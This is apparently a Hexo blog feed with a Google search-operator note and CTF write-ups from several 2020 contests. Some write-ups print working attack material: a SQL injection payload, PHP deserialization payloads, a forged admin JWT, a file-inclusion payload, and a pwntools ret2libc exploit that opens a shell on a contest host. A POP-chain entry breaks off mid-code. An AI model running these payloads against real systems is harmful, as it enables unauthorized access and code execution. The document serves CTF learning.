-site:bbs.gfan.com，这样的结果比较准确，因为扫除了本身的干扰，它将返回机锋网链接到的页面。从机锋指向其他页面。</p><p>二十二、cache，提交cache:url，Google会显示当前网页的快照信息，从而替换网页的当前信息。这个命令现在也被Google集成到了搜索结果里，当你把鼠标悬浮在搜索结果上时，右侧会自动出现此结果的快照信息。</p><p>二十三、计算器功能。输入数学表达式，然后Google返回给你一个计算结果。强大的Google不仅支持普通运算，它还支持像三角函数、指数函数甚至是对数函数这样的高级运算。关键是，你会输入这些高级数学符号。</p><p><strong>下面是三个不怎么懂的命令，很少用，而且在有限的实践中也没弄明白是怎么回事，抄一段网上的解释在这里。</strong>*</p><p>二十四、inanchor，它返回的结果是导入链接锚文字中包含搜索词的页面。比如在Google搜索：inanchor:点击这里，返回的结果页面本身并不一定包含“点击这里”这四个字，而是指向这些页面的链接锚文字中出现了“点击这里”这四个字。需要注意区别与inurl，inurl是网页本身的url地址，而inanchor是在外部用于指向该url地址的文本（..之间文本）中找。例如：inanchor:download，你可能会发现有“FlashGet最佳的下载管理模式”，而该页面中根本就没有“download”字样。</p><p>二十五、allinanchor，inanchor的排他性指令。</p><p>二十六、daterange，当我们使用daterange进行查询的时候，Google会将查询的结果限制在一个特定的时间段内，这个时间相对于网站来说，是按网站被Google收录的时间算的。例如：”Spice Girls“ daterange:2450958-2450968。这里时间日期的格式是按天文学的儒略日。（这个搜索语法Google并不推荐使用，因为它会返回一些莫名其妙的东西）</p><p>二十七、allintext: = 搜索文本,但不包括网页标题和链接allinlinks: = 搜索链接, 不包括文本和标题WordA OR WordB = 搜索包含两关键词之一的页面“Word” OR “Phrase” = 精确的要求搜索单词或者句子WordA -WordB = 包含单词A但是不包含单词BWordA +WordB = 都包含<del>WORD = 寻找此单词和它的同义词</del>WORD-WORD = 只搜索同义词,不要原词</p>]]></content>
      
      
      <categories>
          
          <category> 笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Google </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SCTF 2020</title>
      <link href="2020/07/07/2020SCTF/"/>
      <url>2020/07/07/2020SCTF/</url>
      
        <content type="html"><![CDATA[<h1 id="sign-in"><a href="#sign-in" class="headerlink" title="sign-in"></a>sign-in</h1><p>科学上网，进入tg群即可获取flag</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/2357551551.png"></p><h1 id="Dou-dizhu"><a href="#Dou-dizhu" class="headerlink" title="Dou dizhu"></a>Dou dizhu</h1><p>顾名思义，斗地主赢了就能拿到flag</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/914195782.png"></p><h1 id="Can-you-hear"><a href="#Can-you-hear" class="headerlink" title="Can you hear"></a>Can you hear</h1><p><a href="https://pan.baidu.com/s/1f4mKbBWD4qcbz8DOAKsqlQ"><strong>附件</strong></a>（提取码：rcpv）</p><p>无线电，利用工具robot36得到flag</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/3845721635.png"></p>]]></content>
      
      
      <categories>
          
          <category> Writeup </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SCTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>DASCTF六月赛 2020</title>
      <link href="2020/06/26/2020DASCTF%E5%85%AD%E6%9C%88%E8%B5%9B/"/>
      <url>2020/06/26/2020DASCTF%E5%85%AD%E6%9C%88%E8%B5%9B/</url>
      
        <content type="html"><![CDATA[<h2 id="透明度"><a href="#透明度" class="headerlink" title="透明度"></a>透明度</h2><p><a href="https://pan.baidu.com/s/13r-zafd2Bhol5c24pgOnmA"><strong>附件</strong></a>（提取码：wzbv）</p><p>本来这个alpha是透明度，但是0~7却都有东西</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/2101259497.png"></p><p>这里很明显看出有个包，于是就保存二进制文件</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/2216304538.png"></p><p>接着就把包分解出来，打开发现是加密的<br>于是根据提示开始爆破获取密码：nepnb，最终得到flag</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/2586896462.png"></p><h2 id="cryptographic-call"><a href="#cryptographic-call" class="headerlink" title="cryptographic_call"></a>cryptographic_call</h2><p><a href="https://pan.baidu.com/s/1a7SlN1hg7vcC2Ob_yb8Ljg"><strong>附件</strong></a>（提取码：3idz）</p><p>这题没搞出来，就分享<a href="http://www.ga1axy.top/index.php/archives/42/"><strong>师傅们的wp</strong></a>吧</p><h2 id="Gemini-Man"><a href="#Gemini-Man" class="headerlink" title="Gemini_Man"></a>Gemini_Man</h2><p><a href="https://pan.baidu.com/s/1Wvjqc0VViGxmpMxTFvbbLg"><strong>附件</strong></a>（提取码：ovao）</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">import gmpy2</span><br><span class="line">from Crypto.Util.number import *</span><br><span class="line">n &#x3D; int(open(&#39;N.txt&#39;,&#39;rb&#39;).read())</span><br><span class="line">c &#x3D; int(open(&#39;C.txt&#39;,&#39;rb&#39;).read())</span><br><span class="line">p,err &#x3D; gmpy2.iroot(n, 2)</span><br><span class="line">q &#x3D; p+2</span><br><span class="line"></span><br><span class="line">d &#x3D; gmpy2.invert(65537,(p-1)*(q-1))</span><br><span class="line">#print long_to_bytes(p)</span><br><span class="line">print long_to_bytes(pow(c,d,n))</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Writeup </category>
          
      </categories>
      
      
        <tags>
            
            <tag> DASCTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>DozerCTF 2020</title>
      <link href="2020/06/14/2020DozerCTF/"/>
      <url>2020/06/14/2020DozerCTF/</url>
      
        <content type="html"><![CDATA[<p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/882724305.png"></p><h2 id="真·签到"><a href="#真·签到" class="headerlink" title="真·签到"></a>真·签到</h2><blockquote><p>题目：这是真的签到题<br><a href="https://pan.baidu.com/s/1PV1LfK0rQIMOtXkCf6_EHg"><strong>附件</strong></a>（提取码：mfvc）</p></blockquote><p>根据附件名字应该就是base解码<br>在各种尝试之后，可发现需要经过base64-&gt;base32-&gt;base16-&gt;base58(国外的）解码之后即可得到flag</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/843456108.png"></p><h2 id="sqli-labs-0"><a href="#sqli-labs-0" class="headerlink" title="sqli-labs 0"></a>sqli-labs 0</h2><blockquote><p>题目：不会吧，不会真有人不会注入吧</p></blockquote><p>参考文章：<a href="https://blog.csdn.net/qq_26406447/article/details/90643951">https://blog.csdn.net/qq_26406447/article/details/90643951</a><br>得到payload：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1%2527;handler &#96;uziuzi&#96; open as harvey;handler harvey read first;handler harvey close;</span><br></pre></td></tr></table></figure><p>最终拿到flag：flag{594cb6af684ad354b4a59ac496473990}</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/2245283226.png"></p><h2 id="py吗？"><a href="#py吗？" class="headerlink" title="py吗？"></a>py吗？</h2><p><a href="https://pan.baidu.com/s/1DWC0CkP2tIJciZ_7pnCgkw"><strong>附件</strong></a>（提取码：yq52）</p><p>考查lsb，steg一下就完事了</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/2379525671.png"></p><p>winhex找到有用信息，b64得到flag</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/1868969866.png"></p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/4233888489.png"></p><h2 id="白给的反序列化"><a href="#白给的反序列化" class="headerlink" title="白给的反序列化"></a>白给的反序列化</h2><blockquote><p>题目：不能再简单了，再简单自杀，flag在flag.php里面</p></blockquote><p>参考：<a href="https://www.cnblogs.com/kevinbruce656/p/11198236.html">https://www.cnblogs.com/kevinbruce656/p/11198236.html</a></p><p>得到payload：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O: <span class="number">4</span>:<span class="string">&quot;home&quot;</span>: <span class="number">2</span>:&#123;s: <span class="number">12</span>:<span class="string">&quot;%00home%00method&quot;</span>;s: <span class="number">5</span>:<span class="string">&quot;mysys&quot;</span>;s: <span class="number">10</span>:<span class="string">&quot;%00home%00args&quot;</span>;a: <span class="number">1</span>:&#123;i:<span class="number">0</span>;s: <span class="number">8</span>:<span class="string">&quot;flag.php&quot;</span>;&#125;&#125;</span><br></pre></td></tr></table></figure><p>最终拿到flag：flag{j4nc920fm8b2z0r2mc7dsf87s6785a675sa776vd}</p><h2 id="upload"><a href="#upload" class="headerlink" title="upload"></a>upload</h2><blockquote><p>题目：where is the file？（flag格式Dozerctf{XXXXXXXXXXXXXXX}）<br><a href="https://pan.baidu.com/s/11tWG9GJlR0HpOZnx07DRKA"><strong>附件</strong></a>（提取码：swrj）</p></blockquote><p>分析一波流量包发现有个包，提取出来是个加密的包<br>一开始在流量包里面查找无果，看来只能爆破了，但又没说几位数的密码，头大<br>后来参考<a href="https://www.pianshen.com/article/8772313592/"><strong>文章</strong></a>之后发现是<a href="https://blog.harvey.plus/"><strong>crc</strong></a></p><h3 id="crc工具（提取码：926k）"><a href="#crc工具（提取码：926k）" class="headerlink" title="crc工具（提取码：926k）"></a><a href="https://pan.baidu.com/s/1urmCS9YptKbezcw4UPf8Mw">crc工具</a>（提取码：926k）</h3><p>接着爆破出CRC一样的文本就能得到原文了</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/4283477376.png"></p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/789171801.png"></p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/2919689297.png"></p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/599867676.png"></p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/458036917.png"></p><p>最终组合一下得到flag：Dozerctf{can_U_find_thefilefrom_traffic}</p><h2 id="easy-maze"><a href="#easy-maze" class="headerlink" title="easy_maze"></a>easy_maze</h2><blockquote><p>题目：应该是比较容易的maze了吧！最终结果请以Dozerctf{}格式提交。<br><a href="https://pan.baidu.com/s/1hW88fk3VMC_4QgEW30_cVA"><strong>附件</strong></a>（提取码：5t57）</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/3495341980.png"></p><p>最后md5加密得到flag:Dozerctf{e2b94144f06fdb08695065331d44b59e}<br>附上脚本：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line">#coding:utf-8</span><br><span class="line">str2&#x3D;[]</span><br><span class="line">str3&#x3D;[&#39;W&#39;,&#39;A&#39;,&#39;S&#39;,&#39;D&#39;]</span><br><span class="line">def en1():</span><br><span class="line">    s&#x3D;str3[0]</span><br><span class="line">    str3[0]&#x3D;str3[2]</span><br><span class="line">    str3[2]&#x3D;s</span><br><span class="line">def en2():</span><br><span class="line">    s&#x3D;str3[0]</span><br><span class="line">    str3[0]&#x3D;str3[1]</span><br><span class="line">    str3[1]&#x3D;str3[2]</span><br><span class="line">    str3[2]&#x3D;str3[3]</span><br><span class="line">    str3[3]&#x3D;s</span><br><span class="line">def en3():</span><br><span class="line">    s&#x3D;str3[1]</span><br><span class="line">    str3[1]&#x3D;str3[3]</span><br><span class="line">    str3[3]&#x3D;s</span><br><span class="line">    s&#x3D;str3[0]</span><br><span class="line">    str3[0]&#x3D;str3[2]</span><br><span class="line">    str3[2]&#x3D;s</span><br><span class="line">def en4():</span><br><span class="line">    s&#x3D;str3[3]</span><br><span class="line">    str3[3]&#x3D;str3[2]</span><br><span class="line">    str3[2]&#x3D;str3[1]</span><br><span class="line">    str3[1]&#x3D;str3[0]</span><br><span class="line">    str3[0]&#x3D;s</span><br><span class="line">def start():</span><br><span class="line">    str4&#x3D;&#39;&#39;</span><br><span class="line">    for i in range(len(str2)):</span><br><span class="line">        if str2[i]&#x3D;&#x3D;&#39;W&#39;:</span><br><span class="line">            str4+&#x3D;str3[0]</span><br><span class="line">            en1()</span><br><span class="line">        if str2[i]&#x3D;&#x3D;&#39;A&#39;:</span><br><span class="line">            str4+&#x3D;str3[1]</span><br><span class="line">            en2()</span><br><span class="line">       if str2[i]&#x3D;&#x3D;&#39;S&#39;:</span><br><span class="line">            str4+&#x3D;str3[2]</span><br><span class="line">            en3()</span><br><span class="line">        if str2[i]&#x3D;&#x3D;&#39;D&#39;:</span><br><span class="line">            str4+&#x3D;str3[3]</span><br><span class="line">            en4()</span><br><span class="line">    return str4</span><br><span class="line">if __name__&#x3D;&#x3D;&#39;__main__&#39;:</span><br><span class="line">    str1&#x3D;input(&#39;请输入移动字符(WSAD上下左右):&#39;)</span><br><span class="line">    for c in str1:</span><br><span class="line">        str2.append(c)</span><br><span class="line">    print(start())</span><br></pre></td></tr></table></figure><h2 id="ret-temp"><a href="#ret-temp" class="headerlink" title="ret temp"></a>ret temp</h2><blockquote><p>题目：别催了别催了，你们要的简单题<br>nc 118.31.11.216 36666<br><a href="https://pan.baidu.com/s/1y0JOb3zPrkzwB6osgz1l8A"><strong>附件</strong></a>（提取码：bg61）</p></blockquote><p>exp：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">conn&#x3D;remote(&#39;118.31.11.216&#39;,36666)</span><br><span class="line">#conn&#x3D;process(&#39;.&#x2F;pwn&#39;)</span><br><span class="line">e&#x3D;ELF(&#39;.&#x2F;pwn&#39;)</span><br><span class="line">pad&#x3D;112</span><br><span class="line">write_plt&#x3D;e.symbols[&#39;write&#39;]</span><br><span class="line">vul_addr&#x3D;e.sym[&#39;_start&#39;]</span><br><span class="line">bss_addr&#x3D;e.bss()</span><br><span class="line">def leak(address):</span><br><span class="line">    payload1&#x3D;&#39;a&#39;*pad+&quot;BBBB&quot;+p32(write_plt)+p32(vul_addr)+p32(1)+p32(address)+p32(4)</span><br><span class="line">    conn.sendline(payload1)</span><br><span class="line">    data&#x3D;conn.recv(4)</span><br><span class="line">    return data </span><br><span class="line">d&#x3D;DynELF(leak,elf&#x3D;e)</span><br><span class="line">system_addr&#x3D;d.lookup(&#39;system&#39;,&#39;libc&#39;)</span><br><span class="line">print hex(system_addr)</span><br><span class="line">read_plt&#x3D;e.symbols[&#39;read&#39;]</span><br><span class="line">payload2&#x3D;&#39;a&#39;*pad+&quot;BBBB&quot;+p32(read_plt)+p32(vul_addr)+p32(0)+p32(bss_addr)+p32(8)</span><br><span class="line">conn.sendline(payload2)</span><br><span class="line">conn.send(&quot;&#x2F;bin&#x2F;sh\x00&quot;)</span><br><span class="line">payload3&#x3D;&quot;a&quot;*pad+&quot;BBBB&quot;+p32(system_addr)+&#39;dead&#39;+p32(bss_addr)</span><br><span class="line">conn.sendline(payload3)</span><br><span class="line">conn.interactive()</span><br></pre></td></tr></table></figure><h2 id="貌似有些不对"><a href="#貌似有些不对" class="headerlink" title="貌似有些不对"></a>貌似有些不对</h2><blockquote><p>题目：这是谁的课程设计？做的好烂！<br><a href="https://pan.baidu.com/s/1naGkAx9_u25mvM27DHNdQQ"><strong>附件</strong></a>（提取码：71ka）</p></blockquote><p>源文件下载下来，查看里面的字符串，有base替换字符和密文</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/3664153200.png"></p><p>最后b64得到flag：Dozerctf{old_man_is_good_man!}<br>脚本参照：<a href="https://blog.csdn.net/hackerwin7/article/details/44749487">https://blog.csdn.net/hackerwin7/article/details/44749487</a><br>（密码表换成程序里面的就o了）</p>]]></content>
      
      
      <categories>
          
          <category> Writeup </category>
          
      </categories>
      
      
        <tags>
            
            <tag> DozerCTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>RCTF 2020</title>
      <link href="2020/06/05/2020RCTF/"/>
      <url>2020/06/05/2020RCTF/</url>
      
        <content type="html"><![CDATA[<p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/4123070677.png"></p><center>赛前</center><h1 id="Welcome-to-the-RCTF-2020"><a href="#Welcome-to-the-RCTF-2020" class="headerlink" title="Welcome to the RCTF 2020"></a>Welcome to the RCTF 2020</h1><p>科学上网，进群即可得到flag</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/820402767.png"></p><h2 id="赛后（爷是懒狗"><a href="#赛后（爷是懒狗" class="headerlink" title="赛后（爷是懒狗"></a>赛后（爷是懒狗</h2><h1 id="listen"><a href="#listen" class="headerlink" title="listen"></a>listen</h1><p><a href="https://pan.baidu.com/s/1uAyMhXXAm178ZSIsSlT6BQ"><strong>附件</strong></a>（提取码：5szj）</p><p>不愧是杂项，认谱<br>爷不会</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/3224104186.png"></p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/3445341039.png"></p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/3769664051.png"></p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/877345846.png"></p><blockquote><p>敢问出题人你收到的榔头能否开连锁店了qwq</p></blockquote><h1 id="Animal"><a href="#Animal" class="headerlink" title="Animal"></a>Animal</h1><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/1403331967.png"></p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/3680391772.png"></p><p><a href="https://pan.baidu.com/s/1Mo-MTAlYngwvd1FI4npcqA"><strong>附件</strong></a>（提取码：1689）</p><p>压缩包加密了，需要打开Message得到密码<br>看过wp知道他是摩斯密码<br>delay(500)为‘-’ ， delay(200)为‘.’<br>接着按调用顺序拓展</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/901735005.png"></p><p>解密得到：CQCQCQDEKDEK88SKSK（<a href="https://en.wikipedia.org/wiki/Morse_code_abbreviations"><strong>参考文章</strong></a>）（科学上网</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/3791110576.png"></p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/255167370.png"></p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/1803295814.png"></p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/3855881060.png"></p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/2533855544.png"></p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/1296790193.png"></p><p>解压之后拿到cfa和一个二维码，二维码是烟雾弹<br>流量分析cfa蓝牙文件提取出四张图片，注意到有一个secret图片<br>stegdetect判断为jphide解密<br>steghide解密后拿到字符串<br>aHR0cHMlM0EvL216bC5sYS8yV0VqbjVh<br>base64解密得到短链<br><a href="https://mzl.la/2WEjn5a">https://mzl.la/2WEjn5a</a><br>跳转后是一个emoji加密，密钥挨个点过去（坏，发现是一本书，解密即可~</p>]]></content>
      
      
      <categories>
          
          <category> Writeup </category>
          
      </categories>
      
      
        <tags>
            
            <tag> RCTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>NUAACTF 2020</title>
      <link href="2020/05/31/2020-NUAA-CTF/"/>
      <url>2020/05/31/2020-NUAA-CTF/</url>
      
        <content type="html"><![CDATA[<blockquote><p>前言：爷是懒狗，剩下的题懒得复现了，就直接发官方wp</p><p><a href="http://harvey.plus/wp/2020-NUAACTF-SZCup-master.zip"><strong>2020NUAACTF官方wp</strong></a></p></blockquote><h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><h2 id="checkin"><a href="#checkin" class="headerlink" title="checkin"></a>checkin</h2><blockquote><p>题目：签到就完事了 <a href="http://139.9.221.0:8086/">http://139.9.221.0:8086</a></p></blockquote><p>解题思路：<br>此题考查curl命令，curl一下直接出flag</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/710244822.png"></p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/506724736.png"></p><h2 id="jwt"><a href="#jwt" class="headerlink" title="jwt"></a>jwt</h2><blockquote><p>题目：狸猫换太子？嘤嘤嘤 要拿flag，你需要成为admin <a href="http://139.9.221.0:8090/">http://139.9.221.0:8090/</a></p></blockquote><p>解题思路：<br>考查jwt<br>打开网页就是个简陋的登录界面</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/2912757567.png"></p><p>首先需要jwt爆破得到secret<br>接着重新组装jwt，然后替换原来的</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/1187502005.png"></p><p>注册登录，找到其cookie</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/798635598.png"></p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/2947966423.png"></p><h4 id="在线工具"><a href="#在线工具" class="headerlink" title="在线工具"></a><a href="https://jwt.io/"><strong>在线工具</strong></a></h4><p>输入所得到的的secret和jwt，然后改用户名为admin</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/1321619984.png"></p><p>最后修改cookie</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">document.cookie&#x3D;&quot;JWT&#x3D;eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIn0.SYQ-AGwY5XIcxY621ToK8zEgomHE0Bla9tAUWTLxnwA&quot;</span><br></pre></td></tr></table></figure><p>刷新即可得到flag</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/4156064202.png"></p><h2 id="easypop"><a href="#easypop" class="headerlink" title="easypop"></a>easypop</h2><blockquote><p>题目：<a href="http://139.9.221.0:8088/">http://139.9.221.0:8088/</a></p></blockquote><p>解题思路：<br>代码审计</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/3843348484.png"></p><p>运行PHP代码，得到payload<br><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/1855814344.png"></p><p>有个d的参数可以传参，于是加上?d=payload，得到最终的flag</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/1996209671.png"></p><h2 id="command"><a href="#command" class="headerlink" title="command"></a>command</h2><blockquote><p>题目：<a href="http://139.9.221.0:8092/">http://139.9.221.0:8092/</a></p></blockquote><p>解题思路：<br>文件包含，伪协议读取文件内容，过滤了flag，也过滤了data没法直接读，看到createfun.php，再得到其源码，readfile去读flag.php</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/367624342.png"></p><p>url出现?file=index  <img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/3937660028.png"></p><p>文件读取  <img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/3088521944.png"></p><p>解码后：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php  error_reporting(0);</span><br><span class="line">   @$file &#x3D; $_GET[&quot;file&quot;];</span><br><span class="line">   if(isset($file)) &#123;      if(preg_match(&#39;&#x2F;http|data|ftp|input|%00|flag&#x2F;i&#39;, $file) || strstr($file,&quot;..&quot;) !&#x3D;&#x3D; FALSE || strlen($file)&gt;&#x3D;100) &#123;</span><br><span class="line">           echo &quot;&lt;p&gt; error! &lt;&#x2F;p&gt;&quot;;</span><br><span class="line">       &#125; </span><br><span class="line">       else &#123;</span><br><span class="line">           include($file.&#39;.php&#39;);</span><br><span class="line">           setcookie(&quot;tips&quot;,&quot;createfun.php&quot;);</span><br><span class="line">       &#125;</span><br><span class="line">   &#125; </span><br><span class="line">   else &#123;</span><br><span class="line">       header(&#39;Location:include.php?file&#x3D;index&#39;);</span><br><span class="line">   &#125;</span><br><span class="line">   ?&gt;</span><br></pre></td></tr></table></figure><p>提示createfun.php，再读一次</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$func &#x3D; @$_GET[&#39;func&#39;];</span><br><span class="line">$arg &#x3D; @$_GET[&#39;arg&#39;];</span><br><span class="line">if(isset($func)&amp;&amp;isset($arg))    &#123;$func($arg,&#39;&#39;);&#125;</span><br><span class="line">readfile(&quot;flag.php&quot;,&quot;&quot;);</span><br></pre></td></tr></table></figure><p>payload： <code>createfun.php?func=show_source&amp;arg=flag.php</code><br>最后得到flag</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/3334144245.png"></p><h2 id="web5（安恒四月赛原题）"><a href="#web5（安恒四月赛原题）" class="headerlink" title="web5（安恒四月赛原题）"></a>web5（安恒四月赛原题）</h2><blockquote><p>题目：<a href="http://139.9.221.0:8094/">http://139.9.221.0:8094/</a></p></blockquote><p>解题思路：<br>pop链 + 反序列化长度逃逸</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/963610115.png"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter_nohack</span>(<span class="params"><span class="variable">$data</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> str_replace(<span class="string">&#x27;flag&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$data</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">C</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$c</span> = <span class="string">&quot;flflagag.php&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">B</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$b</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;b = <span class="keyword">new</span> C();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// O:1:&quot;B&quot;:1:&#123;s:1:&quot;b&quot;;O:1:&quot;C&quot;:1:&#123;s:1:&quot;c&quot;;s:8:&quot;flag.php&quot;;&#125;&#125;</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span> = <span class="string">&#x27;flagflagflagflagflagflag&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$password</span> = <span 